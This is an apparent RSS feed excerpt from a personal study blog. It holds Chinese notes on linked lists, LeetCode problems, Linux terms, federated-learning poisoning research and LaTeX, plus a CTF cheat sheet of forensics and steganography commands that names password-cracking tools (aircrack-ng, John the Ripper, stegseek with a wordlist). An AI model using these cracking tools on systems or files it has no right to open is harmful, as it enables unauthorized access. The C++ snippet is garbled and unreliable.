 &lt;a class="anchor" href="#link-list">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>主要結構
每一個Element都會有兩個儲存單位，一個是儲存資料本體，另一個是儲存pointer，指向下一個Element的位置
&lt;img src="https://hackmd.io/_uploads/SJ0yRNXH3.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Insert &lt;code>GAT&lt;/code>
Create新的node，儲存&lt;code>GAT&lt;/code>，並改變前後的指標，原本&lt;code>FAT&lt;/code>的指標要assign給&lt;code>GAT&lt;/code>的pointer，然後&lt;code>GAT&lt;/code>的位址也要assign給&lt;code>FAT&lt;/code>
&lt;img src="https://hackmd.io/_uploads/H1JrREXBh.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Delete &lt;code>GAT&lt;/code>
把&lt;code>HAT&lt;/code>的位址assign給&lt;code>FAT&lt;/code>
&lt;img src="https://hackmd.io/_uploads/SJ2zkr7B3.png" alt="" />&lt;/p>
&lt;ul>
&lt;li>缺點：如果要delete某一個Element就需要&amp;quot;先找到該Element的位置在哪裡&amp;quot;，如果Link-List 很長，則要做到這件事情的Overhead就會很高&lt;/li>
&lt;li>Solution: Double-Link-List，可以從前後同時找要刪除的Element，這樣的話就會比較快&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="implement">
 Implement
 &lt;a class="anchor" href="#implement">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler Source Code - Composite Classes&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">class ThreeLetterList; // forward delcanon 
class ThreeLetterNode {
 friend class ThreeLetterList; 
 private 
 char data[3]; // 每一個Elment就是只有儲存三個字元
 ThreeLetterNode *link;
};

class ThreeLetterList{ 
 public: 
 // List Manipulat10n operabons 
 private:
 ThreeLetterNode *first;
};
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>LeetCode - Two Sum</title><link>https://bernie6401.github.io/docs/leetcode/easy/leetcode---two-sum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/leetcode/easy/leetcode---two-sum/</guid><description>&lt;h1 id="leetcode---two-sum">
 LeetCode - Two Sum
 &lt;a class="anchor" href="#leetcode---two-sum">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon--description">
 Recon &amp;amp; Description
 &lt;a class="anchor" href="#recon--description">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Description
Given an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.&lt;/p>
&lt;p>You may assume that each input would have exactly one solution, and you may not use the same element twice.&lt;/p>
&lt;p>You can return the answer in any order.&lt;/p>
&lt;p>Example 1:&lt;/p>
&lt;pre tabindex="0">&lt;code>Input: nums = [2,7,11,15], target = 9
Output: [0,1]
Explanation: Because nums[0] + nums[1] == 9, we return [0, 1].
&lt;/code>&lt;/pre>&lt;p>Example 2:&lt;/p></description></item><item><title>LeetCode - Valid Parentheses</title><link>https://bernie6401.github.io/docs/leetcode/easy/leetcode---valid-parentheses/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/leetcode/easy/leetcode---valid-parentheses/</guid><description>&lt;h1 id="leetcode---valid-parentheses">
 LeetCode - Valid Parentheses
 &lt;a class="anchor" href="#leetcode---valid-parentheses">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon--description">
 Recon &amp;amp; Description
 &lt;a class="anchor" href="#recon--description">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Description
Given a string s containing just the characters &amp;lsquo;(&amp;rsquo;, &amp;lsquo;)&amp;rsquo;, &amp;lsquo;{&amp;rsquo;, &amp;lsquo;}&amp;rsquo;, &amp;lsquo;[&amp;rsquo; and &amp;lsquo;]&amp;rsquo;, determine if the input string is valid.&lt;/p>
&lt;p>An input string is valid if:&lt;/p>
&lt;pre>&lt;code>Open brackets must be closed by the same type of brackets.
Open brackets must be closed in the correct order.
Every close bracket has a corresponding open bracket of the same type.
&lt;/code>&lt;/pre>
&lt;p>Example 1:&lt;/p></description></item><item><title>Linux Related</title><link>https://bernie6401.github.io/docs/terminology/linux-related/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/linux-related/</guid><description>&lt;ul>
&lt;li>
&lt;p>What is .so file?
資料來源: &lt;a href="https://knowledge.ni.com/KnowledgeArticleDetails?id=kA00Z000000P8svSAC&amp;amp;l=zh-TW">在Linux中.so和.a檔有什麼差別？&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>副檔名為“ .so”的檔案是dynamically linked shared object libraries，簡稱為shared objects、shared libraries或shared object libraries。Shared object libraries在執行時動態載入。Shared object libraries並不是應用程式的一部分，但它們在編譯過程中必須可用取用。一般來說，shared object libraries類似於Windows電腦上的DLL檔。 舉例來說，NI-VISA驅動程式就是使用Shared object libraries。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>x86、x86_64/x64、amd64和arm64/aarch64
資料來源: &lt;a href="https://blog.csdn.net/michaelwoshi/article/details/105105421">【CPU】關於x86、x86_64/x64、amd64和arm64/aarch64&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>==&lt;strong>x86=i386=IA32&lt;/strong>==: 是指intel的開發的一種32位指令集，從386開始時代開始的，一直沿用至今，是一種cisc指令集，所有intel早期的cpu，amd早期的cpu都支持這種指令集，intel官方文檔里面稱為“IA-32”&lt;/li>
&lt;li>==&lt;strong>x86_64=x64=AMD64&lt;/strong>==: 是x86 CPU開始邁向64位的时候&lt;/li>
&lt;li>==&lt;strong>ARM&lt;/strong>==: （英文為Advanced RISC Machine，或Acorn RISC Machine）也是一個架構，非常適用於移動通信這種低成本，高性能，低耗電的領域。
==&lt;strong>AArch64=ARM64&lt;/strong>==: 是ARMv8的一種執行狀態。為了更廣泛地向企業領域推進，需要引入 64 位構架，同時也需要在 ARMv8 架構中引入新的 AArch64 執行狀態。AArch64 不是一個單純的 32 位 ARM 構架擴展，而是 ARMv8 內全新的構架，完全使用全新的 A64 指令集。&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>Linux 0, 1, 2, 2&amp;gt;&amp;amp;1
資料來源: &lt;a href="https://blog.csdn.net/yzf279533105/article/details/128587714">Linux 裡的文件描述符 0，1，2， 2＞&amp;amp;1 究竟是什麼&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>/dev/null 表示空設備文件
0 表示stdin標準輸入
1 表示stdout標準輸出
2 表示stderr標準錯誤&lt;/p></description></item><item><title>Local Model Poisoning Attacks to Byzantine-Robust Federated Learning - Notes</title><link>https://bernie6401.github.io/docs/survey-papers/federated-learning/local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/federated-learning/local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes/</guid><description>&lt;h1 id="local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes">
 Local Model Poisoning Attacks to Byzantine-Robust Federated Learning - Notes
 &lt;a class="anchor" href="#local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Fang, M., Cao, X., Jia, J., &amp;amp; Gong, N. (2020). Local model poisoning attacks to {Byzantine-Robust} federated learning. In 29th USENIX security symposium (USENIX Security 20) (pp. 1605-1622).
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="what-is-non-iid">
 &lt;a href="https://www.zhihu.com/question/395555567">What is Non-IID?&lt;/a>
 &lt;a class="anchor" href="#what-is-non-iid">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>首先：什麽是獨立同分布？&lt;/p>
&lt;ul>
&lt;li>同分布：所有items均來自同一種概率分布； e.g. 你丟骰子，每次丟骰子到任何一個數字的概率都是1/6，是相等概率。或者說，在概率空間里面，你不論進行幾次抽樣實驗，他們都服從同樣一個分布。&lt;/li>
&lt;li>獨立：這些sample items全部都是獨立事件； e.g. 每次抽樣之間沒有關系，不會相互影響。比如你在隨便丟骰子，每次拋到的數字是幾就是幾，是獨立的。但如果我要求你要兩次拋到的數字和大於等於9，第一次和第二次拋就不獨立，因為他們相互關聯。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ul>
&lt;li>非獨立：有些數據處理的順序不夠隨機。比如有些按時間和其他一些標準來排序的數據會出現相關的情況，違反非獨立的原則。&lt;/li>
&lt;li>非同分布：數據因所處在不同的分區而出現不同的分布。&lt;/li>
&lt;li>Non-IID其實有三種：不獨立但同分布，獨立不同分布，不獨立也不同分布。&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;h3 id="實用拜占庭容錯機制理解">
 &lt;a href="https://zhuanlan.zhihu.com/p/217827966">實用拜占庭容錯機制理解&lt;/a>
 &lt;a class="anchor" href="#%e5%af%a6%e7%94%a8%e6%8b%9c%e5%8d%a0%e5%ba%ad%e5%ae%b9%e9%8c%af%e6%a9%9f%e5%88%b6%e7%90%86%e8%a7%a3">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>拜占庭將軍問題是一個協議問題，拜占庭帝國軍隊的將軍們必須全體一致的決定是否攻擊某一支敵軍。問題是這些將軍在地理上是分隔開來的，並且將軍中存在叛徒。叛徒可以任意行動以達到以下目標：欺騙某些將軍采取進攻行動；促成一個不是所有將軍都同意的決定，如當將軍們不希望進攻時促成進攻行動；或者迷惑某些將軍，使他們無法做出決定。如果叛徒達到了這些目的之一，則任何攻擊行動的結果都是注定要失敗的，只有完全達成一致的努力才能獲得勝利。&lt;/p></description></item><item><title>Machine Learning Hand-write Homework &amp; Answer</title><link>https://bernie6401.github.io/docs/security/course/ntu-ml/machine-learning-hand-write-homework--answer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ml/machine-learning-hand-write-homework--answer/</guid><description>&lt;h1 id="machine-learning-hand-write-homework--answer">
 Machine Learning Hand-write Homework &amp;amp; Answer
 &lt;a class="anchor" href="#machine-learning-hand-write-homework--answer">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ml-machine-learning">
 tags: &lt;code>NTU_ML&lt;/code> &lt;code>Machine Learning&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ml-machine-learning">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/Sk1n8xPWo">HW1&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/ByMEkRdVi">HW1-Ans&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/r1otQp7Gi">HW2&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/H1K9vmYVi">HW2-Ans&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/Hy3kRxTMs">HW3&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/BJod1Djro">HW3-Ans&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/H1ucYOpNo">HW4&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@lH2AB7kCSAS3NPw2FffsGg/H1P8BI2Dj">HW4-Ans&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Math Related</title><link>https://bernie6401.github.io/docs/terminology/math-related/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/math-related/</guid><description>&lt;h1 id="math-related">
 Math Related
 &lt;a class="anchor" href="#math-related">#&lt;/a>
&lt;/h1>
&lt;h2 id="數學字母使用規則">
 數學字母使用規則
 &lt;a class="anchor" href="#%e6%95%b8%e5%ad%b8%e5%ad%97%e6%af%8d%e4%bd%bf%e7%94%a8%e8%a6%8f%e5%89%87">#&lt;/a>
&lt;/h2>
&lt;p>在 LaTeX 中，數學符號（如 &lt;code>\mathscr&lt;/code>, &lt;code>\mathbb&lt;/code>, &lt;code>\mathcal&lt;/code>）通常有特定的用途和限制，主要在於 &lt;strong>哪些類型的變數或集合適合使用哪種格式&lt;/strong>。以下是一些常見的數學字母風格以及它們的用途：&lt;/p>
&lt;hr>
&lt;h3 id="1-mathcal-calligraphic">
 &lt;strong>1. \mathcal (Calligraphic)&lt;/strong>
 &lt;a class="anchor" href="#1-mathcal-calligraphic">#&lt;/a>
&lt;/h3>
&lt;p>&lt;strong>用途&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>用來表示 &lt;strong>集合、空間、拓撲結構、代數結構等&lt;/strong>&lt;/li>
&lt;li>例如：機率論的 &lt;code>\mathcal{F}&lt;/code>（σ-代數）、拓撲空間 &lt;code>\mathcal{T}&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-latex" data-lang="latex">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">\mathcal&lt;/span>{P}, &lt;span style="color:#66d9ef">\mathcal&lt;/span>{L}, &lt;span style="color:#66d9ef">\mathcal&lt;/span>{M}, &lt;span style="color:#66d9ef">\mathcal&lt;/span>{N}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>顯示為：
$$
\mathcal{P}, \mathcal{L}, \mathcal{M}, \mathcal{N}
$$&lt;/p>
&lt;p>&lt;strong>適用範圍&lt;/strong>：
✅ 集合、拓撲、機率論、幾何學
❌ 變數、數值、矩陣&lt;/p>
&lt;hr>
&lt;h3 id="2-mathbb-blackboard-bold">
 &lt;strong>2. \mathbb (Blackboard Bold)&lt;/strong>
 &lt;a class="anchor" href="#2-mathbb-blackboard-bold">#&lt;/a>
&lt;/h3>
&lt;p>&lt;strong>用途&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>用於表示 &lt;strong>數域、特殊集合&lt;/strong>，例如 &lt;strong>實數、整數、複數等&lt;/strong>&lt;/li>
&lt;li>常見於線性代數、數論、分析等&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-latex" data-lang="latex">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">\mathbb&lt;/span>{R}, &lt;span style="color:#66d9ef">\mathbb&lt;/span>{Z}, &lt;span style="color:#66d9ef">\mathbb&lt;/span>{Q}, &lt;span style="color:#66d9ef">\mathbb&lt;/span>{C}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>顯示為：
$$
\mathbb{R}, \mathbb{Z}, \mathbb{Q}, \mathbb{C}
$$&lt;/p>
&lt;p>&lt;strong>適用範圍&lt;/strong>：
✅ 數域、特定的集合（例如 &lt;code>\mathbb{N}&lt;/code> 代表自然數）
❌ 一般變數、函數名稱&lt;/p>
&lt;hr>
&lt;h3 id="3-mathscr-script-font">
 &lt;strong>3. \mathscr (Script Font)&lt;/strong>
 &lt;a class="anchor" href="#3-mathscr-script-font">#&lt;/a>
&lt;/h3>
&lt;p>&lt;strong>用途&lt;/strong>：&lt;/p></description></item><item><title>Maxim</title><link>https://bernie6401.github.io/docs/tools/others/android-app-crawler/maxim/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-app-crawler/maxim/</guid><description>&lt;h1 id="maxim">
 Maxim
 &lt;a class="anchor" href="#maxim">#&lt;/a>
&lt;/h1>
&lt;p>原本的&lt;a href="https://github.com/zhangzhao4444/Maxim">repo README&lt;/a>就說明的很清楚了&lt;/p>
&lt;h2 id="how-to-use">
 How to use
 &lt;a class="anchor" href="#how-to-use">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Environment
&lt;ul>
&lt;li>適用Emulator/Physical Android Version 7, 8, 9, 10, 11，但再往上就會遇到下面的問題&lt;/li>
&lt;li>待測的App需要先安裝&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Push File to Mobile
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb push framework.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push monkey.jar /sdcard
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Command
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ adb shell CLASSPATH=/sdcard/monkey.jar:/sdcard/framework.jar exec app_process /system/bin tv.panda.test.monkey.Monkey -p &amp;lt;app package name&amp;gt; --uiautomatormix --running-minutes 1 -v -v
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Mode: &lt;code>--uiautomatormix&lt;/code>, &lt;code>--uiautomatordfs&lt;/code>, &lt;code>--uiautomatortroy&lt;/code>&lt;/li>
&lt;li>&lt;code>-p&lt;/code>: 需要更改成待測app的package name&lt;/li>
&lt;li>&lt;code>--running-minutes&lt;/code>: 設定要跑多久&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="problem">
 Problem
 &lt;a class="anchor" href="#problem">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>[Maxim] *** ERROR // CRASH: com.xueqiu.android (pid 6940)
[Maxim] *** ERROR // Short Msg: java.lang.UnsatisfiedLinkError
[Maxim] *** ERROR // Long Msg: java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2)
[Maxim] *** ERROR // Build Label: google/sdk_gphone64_x86_64/emulator64_x86_64_arm64:12/SE1A.211212.001.B1/8023802:user/release-keys
[Maxim] *** ERROR // Build Changelist: 8023802
[Maxim] *** ERROR // Build Time: 1640217878000
[Maxim] *** ERROR // java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2)
// at s.h.e.l.l.N.al(Native Method)
// at s.h.e.l.l.A.instantiateApplication(Unknown Source:45)
// at android.app.Instrumentation.newApplication(Instrumentation.java:1177)
// at android.app.LoadedApk.makeApplication(LoadedApk.java:1356)
// at android.app.ActivityThread.handleBindApplication(ActivityThread.java:6686)
// at android.app.ActivityThread.access$1500(ActivityThread.java:247)
// at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2053)
// at android.os.Handler.dispatchMessage(Handler.java:106)
// at android.os.Looper.loopOnce(Looper.java:201)
// at android.os.Looper.loop(Looper.java:288)
// at android.app.ActivityThread.main(ActivityThread.java:7839)
// at java.lang.reflect.Method.invoke(Native Method)
// at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
// at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1003)
//
&lt;/code>&lt;/pre></description></item><item><title>Misc Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/misc-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/misc-cheat-sheet/</guid><description>&lt;h1 id="misc-cheat-sheet">
 Misc Cheat Sheet
 &lt;a class="anchor" href="#misc-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools">
 Online Tools
 &lt;a class="anchor" href="#online-tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Encode &amp;amp; Decode&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://online-barcode-reader.inliteresearch.com/">Free Online Barcode Reader&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://products.aspose.app/barcode/recognize/qr#/recognized">QR Code Barcode Reader Online&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://emn178.github.io/online-tools/index.html">Encoding&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://roar.iiilab.com/">獸語&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="check-file-info">
 Check file info
 &lt;a class="anchor" href="#check-file-info">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ binwalk [-e] [filename] # or binwalk --dd=&amp;#34;.*&amp;#34; [filename]
$ exiftool [filename]
$ pngcheck [filename]
$ stat [filename]
$ file [filename]
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>$ binwalk -e&lt;/code> 的範例可以參考&lt;a href="https://hackmd.io/@SBK6401/BJgwrxWM6#Electric-Steel">Deadface - Electric Steel &lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="steganography">
 Steganography
 &lt;a class="anchor" href="#steganography">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>text: &lt;a href="https://github.com/zed-0xff/zsteg">zsteg&lt;/a>(just for &lt;code>bmp&lt;/code> and &lt;code>png&lt;/code> files), &lt;a href="http://quickcrypto.com/download.html">Quick Crypto&lt;/a>&lt;/li>
&lt;li>file: steghide(&lt;code>sudo apt-get install steghide&lt;/code>)(&lt;code>$ steghide extract -sf atbash.jpg&lt;/code>)&lt;/li>
&lt;li>進階的steghide$\to$&lt;a href="https://github.com/RickdeJager/stegseek">stegseek&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo apt install ./stegseek_0.6-1.deb -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ stegseek &lt;span style="color:#f92672">[&lt;/span>stegofile.jpg&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>wordlist.txt&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="disk-analysis">
 Disk Analysis
 &lt;a class="anchor" href="#disk-analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://darkranger.no-ip.org/archives/v5/document/linux/foremost_recovery.htm">Foremost&lt;/a>: 針對所支援的檔案結構去進行資料搜尋與救援
&lt;code>$ foremost -v {filename}&lt;/code>&lt;/li>
&lt;li>&lt;a href="https://blog.csdn.net/wxh0000mm/article/details/99447206">Sleuth kit/Autopsy&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.exterro.com/ftk-imager">FTK Imager&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@SBK6401/SJOwGrUfa">Logontracer&lt;/a>: Just use GUI to present event log traced on windows
&lt;code>$ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="memory-forensics">
 Memory Forensics
 &lt;a class="anchor" href="#memory-forensics">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>建議直接使用&lt;a href="https://www.volatilityfoundation.org/releases">windown protable version&lt;/a>會比較穩定而且不需要處理環境的問題&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">Volatility - Cheat Sheet&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility3">Volatility 3&lt;/a>
:::spoiler Set up &amp;amp; How2Use
&lt;a href="https://blog.csdn.net/u011250160/article/details/120461405">Windows Volatility 3 Problems &amp;amp; Solutions&lt;/a>
&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/volatilityfoundation/volatility3
$ cd volatility3
$ pip install -r requirement.txt
$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
$ python vol.py -h # For help
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility">Volatility 2&lt;/a>
:::spoiler Set up &amp;amp; How2Use
&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py27 python=2.7
$ conda activate py27
$ git clone https://github.com/volatilityfoundation/volatility
$ cd volatility
$ pip install pycrypto
$ pip install distorm3
$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
$ python vol.py -h # For help
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;/ul>
&lt;h2 id="package">
 Package
 &lt;a class="anchor" href="#package">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://packetlife.net/blog/2008/oct/18/cheat-sheets-tcpdump-and-wireshark/">Wireshark cheat sheet&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.osslab.tw/books/linux-administration/page/nmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E9%9B%86">&lt;code>nmap&lt;/code>&lt;/a>:
&lt;code>$ sudo apt-get install nmap&lt;/code>&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/docs/zh-tw/aix/7.3?topic=n-ntpdc4-command">&lt;code>ntpdc&lt;/code>&lt;/a>
&lt;code>$ sudo apt-get install ntpdc&lt;/code>&lt;/li>
&lt;li>tcpflow
&lt;code>$ sudo tcpflow -r {pcap file}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="brute-force-password">
 Brute Force Password
 &lt;a class="anchor" href="#brute-force-password">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>for WPA/Wifi based: &lt;a href="https://linuxhint.com/install_aircrack-ng_ubuntu/">&lt;code>aircrack-ng&lt;/code>&lt;/a>, &lt;a href="https://ithelp.ithome.com.tw/articles/10280928">Wifite&lt;/a>&lt;/li>
&lt;li>for system user: &lt;a href="https://ithelp.ithome.com.tw/articles/10300529">John the Ripper&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="sound">
 Sound
 &lt;a class="anchor" href="#sound">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>hide files: &lt;a href="https://www.petitcolas.net/steganography/mp3stego/">MP3stego&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./decode -X -P pass svega_stego.mp3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sound to image:
&lt;ul>
&lt;li>&lt;a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">How to convert a SSTV audio file to images using QSSTV - en&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.srcmini.com/62326.html">How to convert a SSTV audio file to images using QSSTV - zh-cn&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>hide message: &lt;a href="https://sourceforge.net/projects/silenteye/">silenteye&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="mail">
 Mail
 &lt;a class="anchor" href="#mail">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://goldfynch.com/goldfynch-pst-viewer">PST Viewer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://products.groupdocs.app/zh-hant/viewer/eml">eml Viewer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.thunderbird.net/zh-TW/">ThunderBird Client&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="overall">
 Overall
